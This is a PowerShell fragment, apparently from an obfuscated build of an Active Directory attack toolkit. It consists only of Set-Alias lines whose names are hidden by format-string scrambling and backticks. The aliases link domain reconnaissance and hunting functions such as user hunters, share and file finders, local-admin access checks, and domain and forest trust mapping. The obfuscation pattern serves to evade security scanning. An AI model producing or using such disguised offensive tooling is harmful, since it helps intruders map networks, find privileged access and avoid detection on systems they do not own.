&("{1}{0}{2}"-f 't-Ali','Se','as') ("{0}{3}{1}{2}"-f 'Get-','et','FileServer','N') ("{2}{0}{3}{4}{1}" -f 'omainF','er','Get-D','ileSe','rv')
&("{1}{0}{2}"-f 'et-','S','Alias') ("{2}{0}{3}{1}" -f't-','share','Ge','DFS') ("{0}{3}{1}{2}" -f 'Get-','inDFS','Share','Doma')
&("{0}{2}{1}" -f'Set-','s','Alia') ("{0}{1}{2}" -f'Get-NetG','P','O') ("{0}{1}{3}{2}" -f'Get-Dom','ain','PO','G')
&("{1}{2}{0}"-f's','Se','t-Alia') ("{2}{0}{1}" -f'et-NetGPOG','roup','G') ("{4}{3}{2}{1}{0}" -f 'lGroup','inGPOLoca','ma','t-Do','Ge')
&("{0}{1}{2}"-f 'Set-','Al','ias') ("{0}{3}{2}{1}"-f'F','Location','-GPO','ind') ("{2}{7}{4}{6}{1}{5}{3}{0}"-f 'Mapping','lGr','Get-D','up','m','o','ainGPOUserLoca','o')
&("{0}{2}{3}{1}"-f 'S','ias','e','t-Al') ("{3}{1}{4}{0}{2}" -f 'Adm','-GPOCo','in','Find','mputer') ("{3}{6}{10}{2}{8}{1}{4}{5}{0}{9}{7}" -f 'M','m','C','Get-','puterLocal','Group','D','pping','o','a','omainGPO')
&("{2}{0}{1}"-f'i','as','Set-Al') ("{4}{1}{2}{0}{3}"-f'L','-Lo','ggedOn','ocal','Get') ("{3}{2}{0}{1}" -f 'g','gedOn','o','Get-RegL')
&("{2}{0}{1}"-f 't','-Alias','Se') ("{3}{1}{4}{8}{7}{2}{0}{5}{6}" -f'nA','e-','mi','Invok','Ch','cc','ess','alAd','eckLoc') ("{0}{3}{4}{1}{2}" -f 'Te','minAcc','ess','st','-Ad')
&("{2}{1}{0}"-f'ias','l','Set-A') ("{1}{0}{2}" -f'-SiteNa','Get','me') ("{4}{5}{2}{0}{1}{3}{6}"-f 'mpu','terSite','Co','N','G','et-Net','ame')
&("{2}{1}{0}"-f 'as','t-Ali','Se') ("{2}{1}{0}" -f 'oxy','t-Pr','Ge') ("{1}{3}{0}{2}{4}"-f'I','G','RegPr','et-WM','oxy')
&("{0}{1}{3}{2}" -f'Set-','A','s','lia') ("{2}{3}{1}{0}{4}"-f'dO','LastLogge','G','et-','n') ("{4}{0}{3}{1}{2}" -f'gLas','gged','On','tLo','Get-WMIRe')
&("{2}{1}{0}"-f 'ias','Al','Set-') ("{2}{3}{1}{4}{5}{0}" -f'ion','che','G','et-Ca','dRDP','Connect') ("{7}{2}{0}{1}{4}{5}{3}{6}" -f'ache','dRDPC','egC','tio','on','nec','n','Get-WMIR')
&("{0}{2}{1}" -f 'Set-','s','Alia') ("{1}{0}{3}{2}{4}{5}"-f 'et-','G','s','Regi','tryMount','edDrive') ("{1}{0}{3}{5}{4}{2}" -f'-','Get','dDrive','W','ounte','MIRegM')
&("{1}{0}{2}" -f't-','Se','Alias') ("{4}{0}{2}{3}{1}"-f '-N','ess','e','tProc','Get') ("{3}{1}{4}{2}{0}" -f'MIProcess','e','W','G','t-')
&("{0}{2}{1}" -f'Se','-Alias','t') ("{6}{5}{1}{4}{3}{2}{0}" -f'n','edF','tio','c','un','voke-Thread','In') NEw`-THREADEd`FUNC`Tion
&("{2}{0}{1}"-f 'li','as','Set-A') ("{0}{4}{1}{2}{3}"-f 'I','ke-U','se','rHunter','nvo') ("{3}{2}{1}{0}{4}" -f 'nUs','mai','Do','Find-','erLocation')
&("{0}{2}{1}"-f'Se','ias','t-Al') ("{0}{1}{2}{3}"-f'I','nvoke-Pro','cessHunt','er') ("{4}{2}{5}{3}{1}{0}"-f 'ss','e','nd-D','oc','Fi','omainPr')
&("{0}{1}{3}{2}" -f'S','e','as','t-Ali') ("{0}{2}{3}{1}" -f'Inv','ntHunter','o','ke-Eve') ("{1}{2}{0}{3}" -f 'omainU','Find-','D','serEvent')
&("{1}{0}{2}" -f'l','Set-A','ias') ("{0}{4}{3}{1}{2}" -f'Inv','eFi','nder','har','oke-S') ("{1}{3}{0}{4}{2}"-f'd-Do','F','inShare','in','ma')
&("{2}{0}{1}"-f'-','Alias','Set') ("{3}{2}{0}{1}{4}{5}" -f 'i','leFi','ke-F','Invo','nde','r') ("{3}{0}{2}{4}{7}{5}{1}{6}" -f'-','mainSh','Int','Find','erestin','Do','areFile','g')
&("{1}{0}"-f't-Alias','Se') ("{0}{1}{3}{4}{2}"-f'Invoke-EnumerateL','oc','in','al','Adm') ("{3}{4}{5}{0}{2}{1}" -f 'oupM','ber','em','Find-','D','omainLocalGr')
&("{1}{0}"-f 'Alias','Set-') ("{3}{4}{2}{1}{0}"-f 't','ainTrus','NetDom','Ge','t-') ("{4}{1}{2}{0}{3}"-f 'inTr','et-','Doma','ust','G')
&("{0}{1}" -f'Set-Al','ias') ("{1}{2}{3}{0}" -f 'st','Ge','t-NetFores','tTru') ("{4}{2}{0}{3}{1}"-f'orestTr','st','-F','u','Get')
&("{0}{2}{1}" -f'S','lias','et-A') ("{2}{3}{1}{0}{4}" -f'e','nd-For','F','i','ignUser') ("{3}{0}{2}{1}" -f'et-DomainFo','nUser','reig','G')
&("{1}{0}{2}" -f 'li','Set-A','as') ("{3}{4}{2}{1}{0}"-f'gnGroup','i','d-Fore','Fi','n') ("{2}{4}{0}{1}{8}{3}{6}{5}{7}"-f 'inFor','e','Ge','gnGr','t-Doma','Mem','oup','ber','i')
&("{0}{1}{2}"-f 'Set-','Al','ias') ("{3}{1}{0}{5}{4}{2}"-f'MapDo','oke-','t','Inv','rus','mainT') ("{3}{6}{2}{0}{4}{1}{5}" -f'mainTr','pp','Do','Ge','ustMa','ing','t-')
&("{0}{1}{2}"-f 'Set-','Alia','s') ("{1}{0}{3}{2}" -f 'omainPol','Get-D','y','ic') ("{4}{0}{5}{2}{1}{3}" -f'om','ol','inP','icyData','Get-D','a')

